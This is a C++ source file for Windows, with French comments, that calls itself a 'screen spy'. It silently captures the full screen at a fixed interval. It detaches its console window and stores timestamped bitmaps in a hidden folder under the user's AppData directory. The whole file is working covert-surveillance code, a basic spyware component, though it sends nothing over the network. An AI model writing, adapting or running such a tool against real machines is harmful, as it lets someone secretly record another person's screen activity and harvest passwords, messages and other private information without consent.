// language: C++17, file: src/tools/07_screenspy.cpp, target: Windows 10/11, MSVC/MinGW
// Screen spy - capture GDI periodique, BMP horodate dans un dossier cache
// Usage: screenspy.exe [interval_sec]   (defaut 60)
// MinGW: g++ -O2 -std=c++17 07_screenspy.cpp -o spy.exe -lgdi32
#include <windows.h>
#include <cstdio>
#include <ctime>
#include <string>

#pragma comment(lib, "gdi32.lib")

static std::string OutDir() {
    char path[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
    strcat_s(path, "\\RickCache");
    CreateDirectoryA(path, NULL);
    strcat_s(path, "\\scr");
    CreateDirectoryA(path, NULL);
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);
    return path;
}

static bool SaveBmp(HDC mem, HBITMAP bmp, int w, int h, const std::string& path) {
    BITMAPINFO bi{};
    bi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth       = w;
    bi.bmiHeader.biHeight      = h;      // bottom-up DIB
    bi.bmiHeader.biPlanes      = 1;
    bi.bmiHeader.biBitCount    = 32;
    bi.bmiHeader.biCompression = BI_RGB;
    DWORD line = ((w * 32 + 31) / 32) * 4;
    DWORD dataSz = line * h;
    std::string buf(dataSz, 0);
    if (!GetDIBits(mem, bmp, 0, h, &buf[0], &bi, DIB_RGB_COLORS)) return false;

    FILE* f = fopen(path.c_str(), "wb");
    if (!f) return false;
    BITMAPFILEHEADER fh{};
    fh.bfType    = 0x4D42;
    fh.bfSize    = sizeof(fh) + sizeof(BITMAPINFOHEADER) + dataSz;
    fh.bfOffBits = sizeof(fh) + sizeof(BITMAPINFOHEADER);
    fwrite(&fh, sizeof(fh), 1, f);
    fwrite(&bi.bmiHeader, sizeof(BITMAPINFOHEADER), 1, f);
    fwrite(buf.data(), 1, dataSz, f);
    fclose(f);
    return true;
}

static void Capture(const std::string& dir) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC screen = GetDC(NULL);
    HDC mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
    HGDIOBJ old = SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, w, h, screen, 0, 0, SRCCOPY);

    char ts[32]; time_t t = time(nullptr);
    tm lt; localtime_s(&lt, &t);
    strftime(ts, sizeof(ts), "%Y%m%d_%H%M%S", &lt);
    SaveBmp(mem, bmp, w, h, dir + "\\scr_" + ts + ".bmp");

    SelectObject(mem, old);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, screen);
}

int main(int argc, char** argv) {
    FreeConsole();
    int interval = argc > 1 ? atoi(argv[1]) : 60;
    std::string dir = OutDir();
    for (;;) {
        Capture(dir);
        // rendu au tick pour une sortie propre en VM
        if (interval < 1) interval = 1;
        Sleep(interval * 1000);
    }
    return 0;
}
